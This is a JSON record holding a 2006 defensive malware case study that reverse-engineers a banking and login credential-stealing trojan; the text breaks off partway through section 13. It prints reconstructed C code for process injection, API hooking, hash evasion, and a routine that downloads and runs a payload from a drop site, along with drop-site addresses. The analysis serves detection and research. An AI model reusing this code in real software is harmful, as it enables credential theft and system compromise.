{
    "id": "0ea5a89e-71ef-47c8-b998-4a617125f213",
    "created_at": "2022-10-25T16:48:14.633258Z",
    "updated_at": "2025-03-27T02:11:04.104027Z",
    "deleted_at": null,
    "sha1_hash": "4576177c81d3ab9b261533765cf286211282290b",
    "title": "pubMalwareCaseStudy",
    "authors": "",
    "file_creation_date": "2006-11-16T11:30:01Z",
    "file_modification_date": "2006-11-16T11:30:01Z",
    "file_size": 549796,
    "plain_text": "# [Prg] Malware Case Study\n\nBy Secure Science Corporation and Michael Ligh\n\n## 13-November 2006, v1.0\n\n\n## Secure Science Corporation\n 7770 Regents Rd. Suite 113-535 (877) 570-0455 San Diego, CA 92122 http://www.securescience.net/\n\n\n-----\n\n# Table of Contents\n\n1 Introduction ...........................................................................................................................................................3\n2 Methodology and Conventions..............................................................................................................................4\n3 Process, Thread, and Data Flow Summary............................................................................................................5\n4 Pre-Infection Anti-Detection Routines ..................................................................................................................6\n5 Procedure for Invoking Remote Threads...............................................................................................................8\n6 Named Pipe Communication.................................................................................................................................9\n7 Mass Process Infection ........................................................................................................................................10\n8 Internal Structures for API Hooks .......................................................................................................................11\n9 Overwriting Function Addresses .........................................................................................................................12\n10 Stealing Data from HTTP Request Buffers .....................................................................................................13\n11 How to Decode and Analyze Stolen Drop Site Data .......................................................................................14\n12 Update and Download Thread.........................................................................................................................17\n13 Stolen Data Upload Thread..............................................................................................................................21\n14 Activity Statistics Thread ................................................................................................................................23\n15 Bleeding-Edge NIDS Signatures .....................................................................................................................25\n16 Trojan Detection and Removal........................................................................................................................26\n17 Trojan Distribution and Discussions................................................................................................................30\n18 Bonus Section: New Malware, New Avenues.................................................................................................31\n19 References and Tools.......................................................................................................................................32\n\n\n-----\n\n# 1 Introduction\n\nThis document contains details of an exploratory case study that was conducted on a malware specimen\nfound in the wild by members of the Mal-Aware Group[1]. The trojan was hosted on web servers located in\nthe Ukraine and Russia, and existed among several gigabytes of data encoded with a proprietary\nalgorithm. There were nearly 10,000 individual files available, each containing between 70 bytes and 56\nmegabytes worth of stolen data that only criminals could read…until now.\n\nThe primary objective for this research was to decode the stolen data and enter it into IntelliFound, which\nis an innovative solution that specializes in returning illegally obtained confidential information to the\nappropriate organizations. A secondary objective for this study is to discover and explain intimate details\non the trojan, which includes but is not limited to, its anti-detection mechanisms, internal data structures,\nAPI hooking functions, and procedures for controlling the flow of data and communication across multiple\nthreads.\n\nThis original report is published here:\nhttp://ip.securescience.net/advisories/pubMalwareCaseStudy.pdf\n\nA program (and source code) for detection of the trojan is available here:\nhttp://ip.securescience.net/advisories/prgdetect.zip\n\nSource code for the reversed trojan and source code for the stolen data decoder may be available by\ncontacting Secure Science Corporation.\n\n1 Secure Science Corporation & Sunbelt-Software\n\n\n-----\n\n# 2 Methodology and Conventions\n\nThis research was conducted by statically analyzing a disassembly of the malware binary, produced by\nIDA Pro, [1]. The code was only executed on a lab system in the last stages of the study, in order to\nobtain packet captures and confirm the accuracy of network IDS signatures.\n\nThroughout this study, the trojan’s source code was reproduced in C. When source code is presented in\nthe report, it is not an exact duplicate of the original code. It is only a modest representation based on the\ncode’s behavior.\n\nWhen variables and function names are used in the context of a paragraph, they will be formatted in 10font Lucida Console like this: GetProcAddress().\n\n\n-----\n\n# 3 Process, Thread, and Data Flow Summary\n\nThis diagram shows a broad overview of the order of execution, direction, and purpose of the primary\nthreads that are spread throughout the system when this trojan is run. The first thread that executes\noutside of prg.exe (original trojan name, but it will vary) is injected into winlogon.exe. From here, two\nadditional threads are created: one to launch a named pipe server for communications with other threads,\nand one to execute inside svchost.exe. The svchost.exe process is by far the busiest, tasked first with\ninjecting a thread into all other active processes on the system (*with exceptions, see Mass Process\nInfection), and then initiating three Internet threads for downloading new trojans, uploading the stolen\ndata to a drop site, and sending activity statistics.\n\nAs shown in the diagram, the thread that executes inside all system processes is responsible for hooking,\namong others, the HttpSendRequestA() and HttpSendRequestW() exports from wininet.dll.\nTherefore, any time an infected process calls one of these functions for HTTP communication, data in the\nrequest buffer is able to be examined by the redirected function. If it meets certain criteria, the data is\nencoded and written to a file on disk, where it is later retrieved by svchost.exe thread number 6 (Stolen\nData Upload Thread) and sent to the drop site.\n\n\n-----\n\n# 4 Pre-Infection Anti-Detection Routines\n\nMost malware authors code their trojans to be as stealthy as possible. If it is easily detected, then it will\nfail to achieve its goals, or at least it will not achieve those goals to the desired or expected scale. On the\ntopic of scales, from one to ten, with ten being the most creative and stealthy, this malware almost does\nnot score. The code displays one attempt to evade signature-based detection and one attempt to steer\nclear of protection services running on the system.\n\nThe trojan’s main() function begins by resolving function imports and initializing global variables. Then it\ntries to obtain a handle to a mutex and if this fails, then the program terminates. This is to ensure that two\ninstances of the same trojan do not execute simultaneously. In the case that the mutex is available, the\nvery next check is to iterate through a global array of process names to determine if any are active on the\nsystem. In the meantime, the trojan writes a copy of itself to the system directory as ntos.exe and\nconfigures the registry to run it at start-up. Then, it goes back to check if any of the target processes were\nrunning. If so, it skips the injection of a thread into winlogon.exe and simply terminates.\n\nAlthough it may seem subtle, this is actually a rather intelligent decision by the malware author. Whereas\naggressive trojans would try to terminate the protection services at the risk of producing a visual detection\ncue (e.g. disappearing icon in the system tray), this trojan just passively terminates. However, it only\nterminates after writing itself to disk and adding itself as an entry in the userinit key of the registry, which\nwill run it from within winlogon.exe during the next reboot. Since this will likely happen before any of the\ntarget processes have started, the trojan will then have the advantage of running before any protection\nservices.\n```\nWCHAR *g_szFindExe[] = { L\"outpost.exe\" };\nbool IsProcessActive(void) {\n    HANDLE hSnapshot;\n    int idx = 0;\n    bool bFound = false;;\n    PROCESSENTRY32W ProcessEntry;\n    ProcessEntry.dwSize = 556;\n    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (!Process32FirstW(hSnapshot, &ProcessEntry)) {\n        CloseHandle(hSnapshot);\n        return(false);\n    }\n    do {\n        if (ProcessEntry.th32ProcessID == 0) { // Skip system idle process\n            continue;\n        }\n        for(idx=0; idx < (sizeof(g_szFindExe) / sizeof(WCHAR *)); idx++) {\n            if (lstrcmpiW(ProcessEntry.szExeFile, g_szFindExe[idx]) == 0) {\n                bFound = true;\n                continue;\n            }\n        }\n    } while(Process32NextW(hSnapshot, &ProcessEntry));\n    CloseHandle(hSnapshot);\n    return(bFound);\n}\n\n```\n\n-----\n\nThe interesting fact behind this technique is that the global array is only filled with one process –\n“outpost.exe.” This corresponds to Outpost Pro Firewall, which has an alleged built-in 360-degree\nprotection from spyware and self-protection from malicious software. For some reason, the malware\nauthor is scared of Outpost and no others. Either that or s/he simply forgot to fill in the array with the\nnames of other products. This is obvious because the IsProcessActive() function clearly iterates\nthrough an array. There is no reason to program an array and an iteration loop into the trojan if the array\nwas meant to only contain one element.\n\nIt is also possible that outpost.exe is the name of another trojan that these same authors have coded and\ndistributed. They may have covertly named it to blend in with systems running the real Outpost process.\nIn this case, the authors may be avoiding outpost.exe because they do not want to run both copies of\ntheir malware on the same system.\n\nWhen this trojan writes itself into the system directory as ntos.exe as mentioned before, it does not make\nan exact duplicate. Instead, it uses CopyFile() to produce ntos.exe, then it opens ntos.exe and sets the\nfile pointer to the end. Next, it computes a pseudo-random number using GetTickCount() as a seed,\nand then generates that number of psudo-random bytes using the same seed. The resulting buffer is\nflushed to the end of ntos.exe. This data section is not referenced again, so it is not there for hiding\ninformation. It is likely there to prevent detection from any services that identify malicious code based on\nfile hash. The following code shows the function which generates these pseudo-random values along with\nsnippets of code from main() that show how the resulting values are used.\n```\nint GenRandomFillByte(int ival, UINT uival) {\n    if (g_ddTick == 0) {\n        g_ddTick = GetTickCount();\n    }\n    g_ddTick = (g_ddTick * 214013) + 2531011;\n    uival = (uival - ival) + 1;\n    return((g_ddTick % uival) + ival);\n}\nddPointer = SetFilePointer(hNtos, 0, NULL, FILE_END);\nuHeapBytes = (GenRandomFillByte(0, 1024)) * 512;\nbtOut = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uHeapBytes);\nfor (ctr = 0; ctr < uHeapBytes; ctr++) {\n    btOut[ctr] = (BYTE)GenRandomFillByte(0, GenRandomFillByte(1, 255));\n}\nWriteFile(hNtos, btOut, uHeapBytes, &dwNumberOfBytesWritten, NULL);\n\n```\n\n-----\n\n# 5 Procedure for Invoking Remote Threads\n\nThere are multiple ways that a process can invoke a thread from within another process. Among the most\ncommon are forcing a process to call LoadLibrary() on a specified DLL, thus invoking that library’s\nDllMain() routine, and by using the CreateRemoteThread() API function. In both cases, the\nrequirement is that the code must exist inside the remote process’ virtual memory space before the\nthread can begin.\n\nThis trojan in particular invokes a thread from its own code base from within a remote process by first\nwriting its entire image into a region on the remote process’ heap; and then calling\nCreateRemoteThread() specifying the address of the desired sub routine. During execution of the\ntrojan’s main() function, a global variable is initialized with a pointer to the trojan’s base address (the\nImageBase member from a PE’s IMAGE_OPTIONAL_HEADER32 structure). This value is used to locate\nthe SizeOfImage member, which indicates the overall size of the PE in memory, including all sections\nand alignment. This is the number of bytes that the trojan tries to write into the heap of a remote process,\nso that it can copy itself entirely.\n\nAn interesting aspect of this routine is that the trojan *requires* the address of its image base to be\navailable in the remote process. When the trojan calls VirtualAllocEx() for the remote process, it\nspecifies its own base address as the desired starting address for the region of pages to allocate. If this\nregion has already been reserved (or committed), then the function fails and CreateRemoteThread()\nis never called. This indicates that the malware author was either too lazy or did not know how to rebase\nthe image in a remote process’ memory region.\n\nHowever the author did know how to rebase the trojan’s own image, because the ImageBase value is\n0x14D00000 instead of the standard 0x00400000. The obvious reason for rebasing the image is to avoid\nconflicts with other modules loaded by the remote process that use the standard address.\n\nThis is the routine used to infect winlogon.exe from prg.exe; and how winlogon.exe infects svchost.exe;\nand how svchost.exe infects all other processes.\n\n\n-----\n\n# 6 Named Pipe Communication\n\nAs shown in the Process, Thread, and Data Flow Summary, once the trojan code is executing within\nwinlogon.exe, it launches a named pipe server to handle communication between the various other\nthreads. The named pipe server is essentially a switch() statement that accepts an integer between 1\nand 13 as the action code, and executes the corresponding action. By analyzing code around the function\ncalls which sends data over the named pipe, and even more so, by analyzing the code within each case\nof the switch statement, one can generate meaningful constants based on the pipe action codes.\n```\n#define PIPE_REQUEST_PROCESS_ID   4\n#define PIPE_REQUEST_VIDEO_OBTAIN  5\n#define PIPE_REQUEST_VIDEO_RELEASE 6\n#define PIPE_REQUEST_AUDIO_OBTAIN  7\n#define PIPE_REQUEST_AUDIO_RELEASE 8\n#define PIPE_REQUEST_NTOS_RELEASE  9\n#define PIPE_REQUEST_NTOS_OBTAIN  10\n#define PIPE_REQUEST_NTOS_LENGTH  11\n#define PIPE_REQUEST_VIDEO_LENGTH  12\n#define PIPE_REQUEST_AUDIO_LENGTH  13\n\n```\nThe purpose of this named pipe server is to maintain control over specific system resources and to\nanswer common questions that other threads may ask. Consider a sample scenario as an explanation of\nthis. As shown in the diagram, API functions in each process on the system are hooked with the intention\nof examining data contained in an HTTP request buffer, and writing an encoded version of that data to a\nfile on disk if it meets certain criteria. The file that receives this data is not arbitrary or random, it is\naudio.dll located in the system32\\wsnpoem directory.\n\nThis means that if two or more processes on the system tried to send an HTTP request at the same point\nin time, they could end up competing for write access to audio.dll. A reasonable solution may be to create\na mutex for write handles to the file; and require all threads to wait on the mutex before attempting to\nopen the file for writing. However, if another process on the system wanted to circumvent that, and file\nsharing was configured incorrectly, all it would need to do is simply fail to check the mutex before\nattempting to acquire a write handle. This is when the pipe server’s benefit becomes apparent.\n\nWhen the initial trojan thread runs from within winlogon.exe, it obtains a handle to audio.dll and specifies\n*no* file sharing. This prevents any other process on the system from accessing the file until\nwinlogon.exe’s handle is closed. In effect, this also prevents any monitoring or analysis programs from\nreading the file’s content unless they forcefully close the handle from within winlogon.exe first; or if they\ncircumvent the Windows API with custom drivers. If they attempt without one of these methods, a sharing\nviolation will occur.\n\nSo, if theoretically no processes can even obtain a read handle to audio.dll, much less write to it, how do\nall the trojanized system processes use it to store stolen data? Well, they simply send a\n```\nPIPE_REQUEST_AUDIO_RELEASE message to the pipe server, which we already know runs from within\n\n```\nwinlogin.exe. This requests winlogon.exe to close its handle to audio.dll for the short period of time\nrequired for the client process to write its information to the file. When complete, the client sends a\n```\nPIPE_REQUEST_AUDIO_OBTAIN message to the pipe server, letting it know that it is safe to re-obtain\n\n```\nan exclusive handle to audio.dll.\n\n\n-----\n\n# 7 Mass Process Infection\n\nThread number 4 from the Process, Thread, and Data Flow Summary shows svchost.exe infecting all\nother processes. As mentioned in the description of the diagram, there are a few exceptions. Two of\nthese exceptions are the original trojan process (prg.exe, or whatever it is named) and the instance of\nsvchost.exe currently executing the thread. A system will normally have multiple copies of svchost.exe\nrunning simultaneously. Based on the trojan’s selection method, it will initially infect the one with the\nlowest pid (the one running as NT AUTHORITY\\SYSTEM).\n\nThe reason why these two processes are skipped during the mass process infection stage is because\nthey already have code at 0x14D00000; and we know from Procedure for Invoking Remote Threads that\nthe trojan is not capable of rebasing its image in a remote process. The two other exceptions are the\nsystem idle process with a pid of 0, and any process named “csrss.exe.”\n\nThe system idle process is not a real process, so it is not a target for infection. Csrss.exe is the only\nprocess in the sub system that has the “critical process” bit set in its kernel process structure (EPROCESS)\nflags field, [2]. If this process is terminated, the system halts with a CRITICAL_PROCESS_DIED blue\nscreen. This program is skipped due to accessibility issues and because of the system stability concerns.\nInterestingly, the code which verifies process names, does not check directory paths, so it will skip\ninfection of any process named csrss.exe and not just the real sub system from system32.\n\nOne can completely screw with the trojan’s decision making routines by renaming their Outpost Pro\nFirewall process from outpost.exe to csrss.exe. In this case, the trojan will move ahead full-throttle with\ninfection of the system, however it will skip the real Outpost process; leaving itself wide open for\ndetection.\n\nIn general, the mass process infection loop is very simple. It is common among malware to just obtain a\nlist of running processes by calling CreateToolhelp32Snapshot() and then cycling through the\nPROCESSENTRY32 structures with Process32First() and Process32Next().\n\nAs shown below, if an exception is not encountered, the process is opened with, among others, the\nVM_WRITE, VM_OPERATION, and CREATE_THREAD permissions; and the obtained handle is passed to\nManageInvasion(). This is an internal function that handles the operations described in Procedure for\nInvoking Remote Threads. The payload of this invasion (a thread) will be described in the next section.\n```\ndo {\n    if (ProcessEntry.th32ProcessID == 0 ||           // skip idle process\n      ProcessEntry.th32ProcessID == g_ddOriginalPid ||    // skip prg.exe\n      ProcessEntry.th32ProcessID == ddOwnPid ||       // skip itself\n      lstrcmpiW(ProcessEntry.szExeFile, L\"csrss.exe\") == 0) // skip csrss.exe\n    {\n        continue;\n    }\n    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | \n    PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, false,\n    ProcessEntry.th32ProcessID);\n    if (hProcess == NULL) {\n        continue;\n    }\n    ManageInvasion(hProcess, ProcessEntry.th32ProcessID); \n    CloseHandle(hProcess);\n} while(Process32NextW(hSnapshot, &ProcessEntry));\n\n```\n\n-----\n\n# 8 Internal Structures for API Hooks\n\nIn order to hook an API function, one must organize various pieces of information or serious problems\ncould occur. This may include the name of the function to be hooked, the name of the library that exports\nthe function to be hooked, the existing address of the function in memory, and the address of a function to\ntake its place. This trojan organizes the information as two internal data structures.\n\nOne of the structures contains five members. The trojan’s global section declares an array of these\nstructures; one for each of the API functions that it wants to hook.\n```\ntypedef struct HOOK_FUNCTION_t {\n    WORD dwStatus;    // status data (e.g. 0==function not hooked)\n    WORD dwReserved;   // this field is not used\n    char *szFunction;  // pointer to null-terminated function name\n    void *oldAddress;  // pointer to original function in memory\n    void *newAddress;  // pointer to replacement function in memory\n} HOOK_FUNCTION, *PHOOK_FUNCTION;\n\n```\nThe other structure contains only three members, one of which is a pointer to (an array of)\nHOOK_FUNCTION structures. There exists one of these structures for each of the DLL modules that\ncontain a function to be hooked.\n```\ntypedef struct HOOK_MODULE_t {\n    char  *szModule;   // pointer to null-terminated DLL module name\n    HMODULE hModule;    // handle to the module\n    PHOOK_FUNCTION FHOOK; // pointer to HOOK_FUNCTION structure\n} HOOK_MODULE, *PHOOK_MODULE;\n\n```\nThe following table describes the functions that this trojan hooks, the modules from which they are\nexported, and the primary reason for doing so.\n\n**API Function** **Module** **Purpose**\nHttpSendRequestW wininet.dll Examine and steal request buffer data\nHttpSendRequestA wininet.dll Examine and steal request buffer data\nHttpSendRequestExW wininet.dll Examine and steal request buffer data\nHttpSendRequestExA wininet.dll Examine and steal request buffer data\nNtCreateThread ntdll.dll Intercept requests and infect new threads.\nLdrLoadDll ntdll.dll Prevent subsequent calls to LoadLibrary() from restoring the\nhooked function’s address to the original.\nLdrGetProcedureAddress ntdll.dll Prevent subsequent calls to GetProcAddress() from restoring the\nhooked function’s address to the original.\n\nThese redirections ensure that when a process on the system uses the Windows API (as opposed to raw\nsockets) to send an HTTP request, the URL and payload is subject to inspection by the trojan’s code.\nFurthermore, if the process tries to reload the module with hooked functions, or tries to re-request the\nhooked function’s legitimate address, these calls will also be intercepted so that the functions remain\nhooked. The reason the trojan hooks NT exports such as LdrLoadDll() instead of the kernel32\nLoadLibrary() is because libraries can be loaded by calling LdrLoadDll() directly, so simply\nhooking LoadLibrary() would not be effective in all cases. However, since LoadLibrary() itself\ncalls LdrLoadDll(), by hooking LdrLoadDll(), one can be sure that any calls to LoadLibrary()\nwill eventually result in control of execution.\n\n\n-----\n\n# 9 Overwriting Function Addresses\n\nAssuming trojan code is running inside a particular process. To hook an API function, the code could\nlocate its parent process’ import table, parse the import structures, and overwrite the desired address.\nHowever, this is hardly efficient if the process has loaded other modules that also import the same\nfunction. In this case, sure, the function is theoretically hooked, but only from one angle. This is not\noptimal for a malware author as it is hardly comprehensive and can be bypassed by normal operations of\nthe parent process.\n\nThe trojan approaches this problem differently, which enables a higher rate of success. It calls\nEnumProcessModules() to obtain a handle to every module (DLL) in the specified process. Then, it\nloops through each module (the handle is essentially a pointer to the module’s base address in memory).\nIt locates the array of IMAGE_DATA_DIRECTORY structures and from there finds the import table\ninformation. If the imported module name matches the name in one of the HOOK_MODULE structures, then\nthat structure’s HOOK_FUNCTION pointer is de-referenced. A loop ensues to locate each function to be\nhooked.\n\nFor each of the functions, the HOOK_FUNCTION.oldAddress value is located and replaced with the\nHOOK_FUNCTION.newAddress value. This effectively hooks every call to the target function from within\nall modules loaded by the process being infected. This is the same address being overwritten that is filled\nin by the PE loader when it resolves imports for the module. The code below shows an example of how a\nHOOK_FUNCTION structure is initiated.\n```\ng_HOOK_FUNCTION[0].dwStatus = 0;\ng_HOOK_FUNCTION[0].szFunction = \"HttpSendRequestW\";\ng_HOOK_FUNCTION[0].oldAddress = GetProcAddress(hModule, \"HttpSendRequestW\");\ng_HOOK_FUNCTION[0].newAddress = &_HttpSendRequestW;\n\n```\nAs shown, the oldAddress member is initiated to the legitimate function’s base address in memory, as\nreturned by GetProcAddress(). This information is obtained before LdrGetProcedureAddress() is\nhooked, so it is sanitary. The newAddress member is initialized to the offset of the replacement function\nin the trojan’s own code base.\n\n\n-----\n\n# 10 Stealing Data from HTTP Request Buffers\n\nThe trojan is able to examine and steal data from HTTP request buffers even if the user is visiting an SSL\nsite, using a virtual keyboard, or copies and pastes information into a browser using the clipboard. Once\nthe HttpSendRequest*() replacement functions begin to execute, one of the first tasks is to examine\nthe data waiting in the request buffer. The trojan only steals information from POST requests with a\nContent-Type of “application/x-www-form-urlencoded.” It ignores GET requests; and POST requests with\nother content types. In order to discover this information, it calls HttpQueryInfo() twice, once with an\ninfo level of HTTP_QUERY_REQUEST_METHOD and once with HTTP_QUERY_CONTENT_TYPE. Then it\nsimply does a string comparison on the returned value.\n\nIf the hooked function will not be stealing the request buffer data, it simply proceeds with calling the\nlegitimate HttpSendRequest*() function. Otherwise, it will learn the URL to which the data is\nsupposed to be POSTed by calling InternetQueryOption(). Then, the data to be stolen is copied to\na region on the heap and formatted according to the following structure:\n```\ntypedef struct STOLEN_DATA_t {\n    DWORD ddReserved1;        // must be NULL\n    WORD dwStructureSize;      // structure header length\n   BYTE bModuleSzLen;        // length of module's name\n    WORD ddReserved2;        // must be NULL\n    DWORD ddTotalLength;       // length of entire record\n    SYSTEMTIME SystemTime;      // system time \n    WORD dwTimeBias;         // time bias\n    BYTE bMajorVersion;       // major and minor version \n    BYTE bMinorVersion;       //  (e.g. 5.1 == Windows XP)\n    WORD dwBuildNumber;       // build number (e.g. 2600)\n    BYTE bServicePack;        // system's service pack \n    DWORD ddTickResult;        // result of GetTickCount()\n    WORD dwLanguageID;        // system's default language\n    char szModuleFileName[];     // module path (length varies)\n    char szUrlAndPayload[];     // URL & POST payload (length varies)\n} STOLEN_DATA;\ntypedef struct HALL_RECORD_t {\n    DWORD ddSignature;         // \"HALL\"\n    DWORD ddRecordLength;       // length of RECORD\n    STOLEN_DATA RECORD;        // structure of stolen info\n} HALL_RECORD;\n\n```\nThe STOLEN_DATA members are initialized with information such as the full path to the module making\nthe HTTP request (e.g. C:\\Program Files\\Mozilla Firefox\\firefox.exe); the system’s date and time; major,\nminor, and build versions for the operating system; the system’s default language; and of course the URL\nand POST payload. The entire buffer is encoded with the trojan’s proprietary, but rather simple, algorithm\n(revealed in the next section).\n\nThen, a write handle to audio.dll is obtained by first sending the named pipe server a\n```\nPIPE_REQUEST_AUDIO_RELEASE message. When the record is appended to the file, it contains the 4\n```\nbyte signature “HALL” and a 4-byte length field. Here, the data will wait until the Stolen Data Upload\nThread retrieves it.\n\n\n-----\n\n# 11 How to Decode and Analyze Stolen Drop Site Data\n\nAs mentioned in the Introduction, the same web servers hosting the malware binary were accompanied\nby several gigabytes of files containing encoded STOLEN_DATA structures. By reversing engineering the\nencoding function, a decoding program can be produced. The bulk of the routine is rather simple. The\nloop iterates once for each byte in the buffer, and applies a simple math formula based on if the byte is\neven or odd in sequence. The resulting buffer is decompressed according to the LZNT1 algorithm, which\nis available via the RtlDecompressBuffer() export from ntdll.dll. Here are a few lines from the\ndecoding program’s source that show how most of the work is done:\n```\nfor(uiCnt=0; uiCnt < ddlength; uiCnt++) {\n    myByte = (BYTE)uiCnt;\n    if( ((BYTE)uiCnt & 0x01) == 0 ) { \n       myByte += 5;\n       myByte *= 2;\n    } \n    else {\n       myByte = 0xF9 - (myByte * 2);\n    }\n    buffer[uiCnt] += myByte;\n}\n\n```\nThe following images show a before and after screen capture of sample data:\n\n\n-----\n\nNotice the URL is to an HTTPS web site, but the stolen data appears in plain text after decoding. This is\nbecause at the point it time when the data is stolen from the request buffer, it has not been encrypted with\nSSL yet.\n\nThe following statistics are output from the decoding program when it is run on all the encoded data from\nboth known drop sites. The first table shows the most frequent destination domains matching the string\n“bank” for which user information was compromised. Recall from Stealing Data from HTTP Request\nBuffers that each of these records contain the full URL and un-encrypted POST payload of a user’s web\nrequest.\n\nDestination URL (bank) Records\nhttps://sitekey.bankofamerica.com 186\nhttp://mail.coldwellbanker.com 179\nhttps://chaseonline.chase.com 95\nhttps://netbank.ffsb.com 22\nhttps://o9863652.da-us.citibank.com 20\n\nThe following table shows the most frequent destination domains matching the string “login.”\n\nDestination URL (login) Records\nhttps://login.facebook.com 7482\nhttp://login.myspace.com 5165\nhttps://login.yahoo.com 2419\nhttps://login.live.com 1390\nhttp://login.netdragons.com 109\n\nThe following table shows the most frequent destination domains matching the string “mail,” excluding\nany results that exist in the previous tables (e.g. mail.coldwellbanker.com).\n\nDestination URL (mail) Records\nhttps://*.*.mail.yahoo.com 3892\nhttps://*.*.hotmail.msn.com 520\nhttp://webmail.bellsouth.net 405\nhttp://mail.google.com 90\nhttp://mailcenter.comcast.com 55\n\nThe following table shows selected extracts from the list of destination domains.\n\nDestination URL (selected) Records\nhttps://www.paypal.com 235\nhttps://*.ebay.com 598\nhttps://www.amazon.com 100\n\nFinally, the last destination domain-related table shows the adware and spyware related sites. It would\nappear that the systems infected with this trojan are also infected with a large amount of other nasty\nprograms.\n\nName Destination URL (adware) Records\nTarget Saver http://a.targetsaver.com 352956\nOuterinfo http://cu.outerinfo.com 197650\nWebSearch http://download.websearch.com 64396\nThink-Adz http://www.think-adz2.com 59763\nHotbar http://config.hotbar.com 39259\nWildtangent http://ddcm.wildtangent.com 36497\n\n\n-----\n\nInternet Optimizer http://www.internet-optimizer.com 22665\n180Solutions http://config.180solutions.com 17116\n\nThe remaining statistics to share are gathered from the same stolen data records as the payload content.\nThe first table shows the active operating system running on the victim machines.\n\nRecords OS Version\n1058354 Windows XP (2600)\n84469 Windows 2000 (2195)\n11 Windows Server 2003 or 2003 R2 (3790)\n4 Windows XP (2526)\n\nThe following table shows the default user language for which the victim machine is configured.\n\nRecords Language\n1129815 English\n12497 Chinese (Simplified)\n133 French\n132 Spanish\n126 Chinese (Traditional)\n78 Czech\n30 Arabic\n27 Korean\n\nThe following table shows the number of stolen data records during the weeks of October 2006. Notice\nthere are 0 records for the first week. This is interesting, because two of the three malware specimens\nthat we have obtained are stamped with a compile time of September 22, 2006. Although this data field\ncan easily be forged, there is no indication of this; and the dates make perfect sense. Remember that the\nmalware author/operator can quickly change drop sites by just modifying uc.bin and waiting for the clients\nto update. Based on this information, the drop site probably existed somewhere else prior to, and\nthroughout, the first week of October.\n\nDate Range Records\n10/1 – 10/7 0\n10/8 – 10/14 401205\n10/15 – 10/21 141199\n10/22 – 10/28 67070\n10/29 – 11/4 264491\n\nThe third malware specimen, without a matching compile time of the first two, is dated October 15, 2006.\nThis sample was donated by Castle Cops MIRT, [9] and will be discussed in the Bonus: New Malware,\nNew Avenues section.\n\n\n-----\n\n# 12 Update and Download Thread\n\nThe first Internet-related thread that runs from within svchost.exe is tasked with updating the trojan’s link\nconfiguration file and downloading an arbitrary file. If the file is a 32-bit or 64-bit binary, the trojan tries to\nexecute it on the system with CreateProcess().\n\nGoing back to the discussion about stealth in the Anti-Detection Routines section, a trojan needs some\nway of knowing which site to contact for updates. Malware authors feel the need to do something in order\nto hide the IP address and/or hostname of the site that it will be contacting; even if it hardly increases the\nstealth factor. For example, the method implemented by this trojan prevents “strings” on the binary from\nrevealing the site, but an analyst could just run the code in a lab and observe its DNS request or outgoing\nfirewall/network traffic logs. Otherwise, the code can be analyzed and one will learn that the URL for\nupdating the trojan’s link configuration is found in the executable’s MS-DOS header.\n\nThe URL begins at offset 0x40 into the executable, and the length indicator is found one byte before the\n4-byte PE signature. The URL below is 0x2A bytes long, making it end just before the “This program\ncannot be run in DOS mode.” message.\n\n\n-----\n\nThe trojan uses the same encoding algorithm for the URL as it uses for the POST payload data. It\ndecodes it in place (Note: This section of an executable is normally not writable, however by the time this\nparticular thread executes, it does so from the heap region of a remote process; and the allocated heap\nregion is writable. The URL is also not completely decoded it place; only the literal decoding is done in\nplace since it is byte-for-byte operation. Before decompression takes place, the string is moved to the\nheap.), which then reveals one of the two URLs (the Ukraine and Russia-based drop sites).\n\nhttp_//progdav-gut.org.ru/prg/uc.bin\nhttp_//72.36.223.62/uc.bin\n\nNot surprisingly, the uc.bin file is encoded with the same algorithm as the other data, however the\nstructures are a little different. One cannot simply run the same decoding program on this file, because its\nbyte offsets are different and if you remember, the byte offsets are the major deciding factor on which\nmath formula to apply to the byte. Here is the structure of the uc.bin records:\n```\ntypedef struct UCBIN_RECORD_t {\n    short id;        // record id, starting at 1\n    short length;      // length of record data\n    bool isEncoded;     // is the data encoded or not\n    unsigned char szData[]; // record data (URL)\n} UCBIN_RECORD;\n\n```\nThe following screen shot shows the first two records of a uc.bin file with defined data fields:\n\n\n-----\n\nThe key to understanding how data in the uc.bin is used by the Internet threads is to examine the\nmessage codes that are passed to the decoding routine. For example, there exists a function in the binary\nthat accepts and integer (id) value as a parameter. It loops through the records of uc.bin until it finds the\ncorresponding record id, determines the record length, decodes the data, and then returns a pointer to\nthe decoded URL. The Update and Download Thread sends this function an integer value of 2, then\ndownloads the resulting URL as a temporary file. It checks to see if the file contains executable content\nand if so, it executes it. The code below shows a few select lines from these functions that indicate how\nthe record’s return data is utilized:\n```\nDecodeRecordFromFile(2, &lpszdata);\nInternetGetFile(g_hInternet, wcTempFileName, lpszdata);\nif (GetBinaryTypeW(wcTempFileName, &BinaryType) && \n    (BinaryType == SCS_32BIT_BINARY || BinaryType == SCS_64BIT_BINARY)) \n{ \n    StartupInfo.cb = sizeof(STARTUPINFO);\n    if (CreateProcessW(wcTempFileName, NULL, NULL, NULL, NULL, NULL, NULL, NULL, \n        &StartupInfo, &ProcessInformation)) \n    {\n        CloseHandle(ProcessInformation.hProcess);\n        CloseHandle(ProcessInformation.hThread);\n    }\n}\n\n```\nWithout much trouble, the decoding program can be edited for handling UCBIN_RECORD structures as\nwell as HALL_RECORD and STOLEN_DATA structures. Here is the output of a round of decoding on the\nuc.bin file:\n\nBased on the number 2 record, the Update and Download Thread will access “up” from the drop site and\nexecute it if contains executable content. The thread will also access the number 3 record and save it to\nvideo.dll for future use. This is how the trojan updates its link configuration. For example, it was\ninteresting to see that the initial drop site (progdav-gut.org.ru) stopped receiving stolen data on October\n18, 2006. After having reversed the entire trojan’s code and finding no indication of time-based uploading,\nthis made no sense at first. Surely 100% of the infected machines did not get dis-infected on the exact\nsame day.\n\n\n-----\n\nRather, this was just the result of the malware author replacing the uc.bin file with a new version that\ncontained different links. This time, they pointed to the 72.36.223.62 drop site. The following screen shots\nshow the last modified dates the files on the two drop sites. Notice the logs/ (where stolen data is posted)\ndirectory of the progdav-gut.org.ru drop site was last modified on October the 18[th]. Moving to the second\nscreen shot, the config.php and install.php files on the 72.36.223.62 drop site were last modified (or\ncreated) on this exact date. Furthermore, the logs/ directory on this new drop site has been updated as\nrecent as yesterday, at the time of this writing. This shows that the drop sites are highly dynamic and the\nauthors/operators are still very active.\n\n\n-----\n\n# 13 Stolen Data Upload Thread\n\nThe thread number 6 from the Process, Thread, and Data Flow Summary diagram takes the 